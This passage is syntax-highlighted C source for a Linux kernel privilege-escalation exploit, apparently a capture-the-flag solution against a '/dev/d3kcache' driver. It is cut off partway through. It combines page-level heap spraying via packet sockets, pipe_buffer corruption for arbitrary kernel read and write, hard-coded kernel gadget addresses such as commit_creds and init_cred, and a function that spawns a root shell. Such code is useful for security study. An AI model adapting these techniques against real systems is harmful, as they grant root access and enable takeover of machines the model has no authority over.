class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_START_IDX 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_START_IDX 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">option</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x114</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x810</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x1919</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x514</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_nr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket_and_alloc_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd, version;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">0</span>,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="keyword">int</span> self_4th_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_2nd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_3rd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read_by_pipe</span><span class="params">(struct page *page_to_read, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write_by_pipe</span><span class="params">(struct page *page_to_write, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> page_offset_base;</span><br><span class="line"><span class="keyword">uint64_t</span> vmemmap_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RET 0xffffffff810157aa</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] faild open d3kcache!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">        <span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">        unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">        write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">            <span class="keyword">if</span> (req.cmd == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">                socket_fd[req.idx] = ret;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = close(socket_fd[req.idx]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line">    <span class="keyword">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_4pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> victim_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> orig_pid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create 